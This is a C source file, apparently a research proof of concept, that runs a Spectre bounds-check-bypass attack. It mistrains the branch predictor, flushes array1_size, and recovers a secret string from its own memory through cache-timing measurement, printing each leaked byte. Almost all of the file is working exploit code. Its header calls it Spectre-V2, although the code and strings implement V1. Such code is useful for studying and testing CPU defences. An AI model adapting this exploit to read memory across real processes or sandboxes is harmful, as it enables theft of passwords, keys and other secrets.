/***********************
** Description: A PoC to confirm Spectre-V2 on x86
**
** Author: hujinwei@iie.ac.cn
***********************/
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <sched.h>
#include <unistd.h>
#include <sys/mman.h>
#include "../tools/tools.h"

#define STRIDE                  4096

#define TARGET_CPU              2

/********************************************************************
 Global Variables and Victim Code
********************************************************************/
volatile unsigned int array1_size = 16;
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
const char *secret = "Spectre V1 PoC attack success!";
uint32_t finished_one = 0;

uint8_t *array2 = NULL;
volatile uint8_t temp = 0;


__attribute__((noinline)) void victim_function(size_t x, size_t divisor) {
    if ( (x % divisor) < (array1_size)) {
        temp &= array2[array1[x] * STRIDE];
    }
}


/********************************************************************
 Attack Logic and Main Function
********************************************************************/
int recover_secret_byte(size_t malicious_x, uint64_t threshold) {
    int results[256] = {0};

    for (int tries = 999; tries > 0; tries--) {
        // 先清侧信道
        for (int i = 0; i < 256; i++) flush_addr(&array2[i * STRIDE]);
        CFENCE;


        for (int j = 29; j >= 0; j--) {
            victim_function(11, 1);      // 条件恒真，训练“taken”
        }

        CLFLUSH(&array1_size);               // 拖慢边界值
        victim_function(malicious_x, 0x3F3F3F3F); // 实际为假，但预测器会猜真

        // 256 桶 = 128 页 × 2 偏移
        for (int off = 0; off < 2; off++) {              // 0 或 2048
            // 128 页的顺序最好做一次 Fisher–Yates 打乱
            for (int page = 0; page < 128; page++) {
                int i = page * 2 + off;                    // 第 page 页的第 off 桶
                if (time_access(&array2[i * STRIDE]) < threshold) results[i]++;
            }
        }
    }

    // 统计时**跳过训练那一行**
    int max = -1, best = -1;
    for (int i = 0; i < 256; i++) {
        if (i < 16) continue;
        if (results[i] > max) { max = results[i]; best = i; }
    }

    if (results[best] > 0) finished_one = 1;
    else finished_one = 0;

    return best;
}


int main() {
    if (geteuid() != 0) {
        fprintf(stderr, "Warning: For best results, run with sudo to enable real-time priority.\n\n");
    }

    array2 = mmap(NULL, 256 * STRIDE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
    if (array2 == MAP_FAILED) {
        printf("Error, cannot allocate memory.\n");
        return -1;
    }

    // 0. 地址探测
    printf("addr of array1_size: %p\naddr of array1: %p\naddr of secret: %p\naddr of finished_one: %p\naddr of array2: %p\naddr of temp: %p\n", &array1_size, array1, &secret, &finished_one, array2, &temp);

    // 1. 设置环境
    int core_id = 1;
    if (pin_to_cpu(core_id) != 0 || set_realtime_scheduling() != 0) {
        fprintf(stderr, "Failed to set up high-precision environment. Aborting.\n");
        restore_cpu();
        return 1;
    }

    // 2. 校准阈值
    uint64_t threshold = measure_access_time();
    if (threshold == 0) {
        fprintf(stderr, "Failed to calibrate threshold. Aborting.\n");
        restore_cpu();
        return 1;
    }

    // 3. 执行 Spectre V1 攻击
    memset(array2, 1, 256 * STRIDE);
    size_t secret_len = strlen(secret);
    char recovered_string[secret_len + 1];
    memset(recovered_string, 0, sizeof(recovered_string));

    printf("[*] Leaking secret: \"%s\"\n", secret);
    printf("[*] Starting attack...\n\n");
    fflush(stdout);
    
    for (int i = 0; i < secret_len; i++) {
        size_t malicious_x = (uintptr_t)(secret + i) - (uintptr_t)array1;
        int recovered_byte = recover_secret_byte(malicious_x, threshold);
        if (!finished_one) {
            i--;
            continue;
        }
        recovered_string[i] = (recovered_byte > 31 && recovered_byte < 127) ? (char)recovered_byte : '?';
        printf("\rLeaked: %s", recovered_string);
        fflush(stdout);
    }
    
    printf("\n\n[*] Attack finished.\n\n");

    // 4. 恢复环境
    restore_cpu();

    return 0;
}

